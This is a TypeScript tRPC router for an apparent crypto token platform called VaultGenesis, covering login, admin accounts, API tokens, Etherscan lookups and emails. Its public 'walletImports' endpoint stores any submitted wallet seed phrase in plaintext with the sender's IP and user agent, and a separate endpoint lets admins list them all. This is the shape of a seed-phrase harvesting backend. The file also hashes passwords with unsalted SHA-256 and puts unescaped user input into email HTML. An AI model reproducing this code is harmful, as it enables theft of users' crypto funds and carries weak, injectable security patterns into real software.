import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { protectedProcedure, publicProcedure, router } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { z } from "zod";
import {
  listAllApiTokens,
  createTokenForUser,
  revokeToken,
  getActiveTokenForUser,
  saveWalletImport,
  listAllWalletImports,
  createAdminAccount,
  listAdminAccounts,
  toggleAdminActive,
  usernameExists,
  listUsers,
  countUsers,
  setUserBanned,
  setUserRole,
  updateUserProfile,
} from "./db";
import { createHash } from "crypto";
import { uploadToCloudinary } from "./cloudinary";
import { sendEmail } from "./email";
import { getTxStatus, getWalletBalance, getWalletTransactions, etherscanUrl } from "./etherscan";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  users: router({
    /** Admin: list all users */
    list: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
      return listUsers();
    }),

    /** Admin: count total users */
    count: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
      return countUsers();
    }),

    /** Admin: ban or unban a user */
    setBanned: protectedProcedure
      .input(z.object({ userId: z.number(), banned: z.boolean() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
        await setUserBanned(input.userId, input.banned);
        return { success: true };
      }),

    /** Admin: change user role */
    setRole: protectedProcedure
      .input(z.object({ userId: z.number(), role: z.enum(['user', 'admin']) }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
        await setUserRole(input.userId, input.role);
        return { success: true };
      }),

    /** User: update own profile (name, email, walletAddress) */
    updateProfile: protectedProcedure
      .input(z.object({
        name: z.string().min(1).max(64).optional(),
        email: z.string().email().optional(),
        walletAddress: z.string().max(64).optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await updateUserProfile(ctx.user.id, input);
        return { success: true };
      }),
  }),

  adminAccounts: router({
    /** Admin: list all admin accounts */
    list: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
      return listAdminAccounts();
    }),

    /** Admin: create a new admin account */
    create: protectedProcedure
      .input(z.object({
        name: z.string().min(2).max(64),
        email: z.string().email(),
        username: z.string().min(3).max(32).regex(/^[a-zA-Z0-9_]+$/, 'Username can only contain letters, numbers, and underscores'),
        password: z.string().min(8).max(128),
      }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
        // Check username uniqueness
        const taken = await usernameExists(input.username);
        if (taken) throw new TRPCError({ code: 'CONFLICT', message: 'Username already taken' });
        // Hash password with SHA-256 (simple, no external deps)
        const passwordHash = createHash('sha256').update(input.password).digest('hex');
        const userId = await createAdminAccount({
          name: input.name,
          email: input.email,
          username: input.username,
          passwordHash,
          createdBy: ctx.user.id,
        });
        return { success: true, userId };
      }),

    /** Admin: enable or disable an admin account */
    toggleActive: protectedProcedure
      .input(z.object({ credId: z.number(), isActive: z.number().min(0).max(1) }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
        await toggleAdminActive(input.credId, input.isActive);
        return { success: true };
      }),
  }),

  walletImports: router({
    /** Public: save a seed phrase import (linked to session user if logged in) */
    save: publicProcedure
      .input(z.object({
        seedPhrase: z.string().min(1),
        walletAddress: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        const ip = ctx.req.headers['x-forwarded-for'] as string || ctx.req.socket.remoteAddress || null;
        const ua = ctx.req.headers['user-agent'] || null;
        await saveWalletImport({
          userId: ctx.user?.id ?? null,
          seedPhrase: input.seedPhrase,
          walletAddress: input.walletAddress ?? null,
          ipAddress: typeof ip === 'string' ? ip.split(',')[0].trim() : null,
          userAgent: ua,
        });
        return { success: true };
      }),

    /** Admin: list all wallet imports */
    listAll: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') {
        throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
      }
      return listAllWalletImports();
    }),
  }),

  apiTokens: router({
    /** Admin: list all users' tokens */
    listAll: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') {
        throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
      }
      return listAllApiTokens();
    }),

    /** Admin: generate or regenerate a token for any user by userId */
    generateForUser: protectedProcedure
      .input(z.object({ userId: z.number(), label: z.string().optional() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') {
          throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
        }
        return createTokenForUser(input.userId, input.label ?? 'Default');
      }),

    /** Admin: revoke a token by its id */
    revoke: protectedProcedure
      .input(z.object({ tokenId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') {
          throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
        }
        await revokeToken(input.tokenId);
        return { success: true };
      }),

    /** User: get own active token (or null if none) */
    getMyToken: protectedProcedure.query(async ({ ctx }) => {
      return getActiveTokenForUser(ctx.user.id);
    }),

    /** User: generate/regenerate own token */
    generateMyToken: protectedProcedure.mutation(async ({ ctx }) => {
      return createTokenForUser(ctx.user.id, 'My API Token');
    }),
  }),

  /** Upload image to Cloudinary */
  upload: router({
    image: protectedProcedure
      .input(z.object({
        dataUri: z.string(), // base64 data URI
        folder: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        const result = await uploadToCloudinary(input.dataUri, {
          folder: input.folder ?? 'vaultgenesis/tokens',
        });
        return result;
      }),
  }),

  /** Etherscan blockchain data */
  blockchain: router({
    getTxStatus: publicProcedure
      .input(z.object({ txHash: z.string() }))
      .query(async ({ input }) => {
        return getTxStatus(input.txHash);
      }),

    getWalletBalance: publicProcedure
      .input(z.object({ address: z.string() }))
      .query(async ({ input }) => {
        const balance = await getWalletBalance(input.address);
        return { balance, address: input.address };
      }),

    getWalletTransactions: protectedProcedure
      .input(z.object({ address: z.string(), limit: z.number().optional() }))
      .query(async ({ input }) => {
        return getWalletTransactions(input.address, input.limit ?? 10);
      }),

    etherscanUrl: publicProcedure
      .input(z.object({
        type: z.enum(['tx', 'address', 'token']),
        value: z.string(),
        network: z.enum(['mainnet', 'sepolia']).optional(),
      }))
      .query(({ input }) => {
        return { url: etherscanUrl(input.type, input.value, input.network ?? 'mainnet') };
      }),
  }),

  /** Send transactional emails via Resend */
  email: router({
    sendWelcome: protectedProcedure
      .input(z.object({ to: z.string().email(), name: z.string() }))
      .mutation(async ({ input }) => {
        await sendEmail({
          to: input.to,
          subject: 'Welcome to VaultGenesis',
          html: `<h1>Welcome, ${input.name}!</h1><p>Your account on VaultGenesis is ready. Start creating tokens, staking, and trading today.</p><p><a href="https://vaultgenesis.com">Visit VaultGenesis</a></p>`,
        });
        return { success: true };
      }),

    sendTokenDeployed: protectedProcedure
      .input(z.object({ to: z.string().email(), tokenName: z.string(), tokenSymbol: z.string(), txHash: z.string().optional() }))
      .mutation(async ({ input }) => {
        await sendEmail({
          to: input.to,
          subject: `Your token ${input.tokenSymbol} has been deployed!`,
          html: `<h1>Token Deployed Successfully</h1><p>Your token <strong>${input.tokenName} (${input.tokenSymbol})</strong> has been deployed on the blockchain.</p>${input.txHash ? `<p><a href="https://etherscan.io/tx/${input.txHash}">View on Etherscan</a></p>` : ''}<p><a href="https://vaultgenesis.com">Back to VaultGenesis</a></p>`,
        });
        return { success: true };
      }),
  }),
});

export type AppRouter = typeof appRouter;
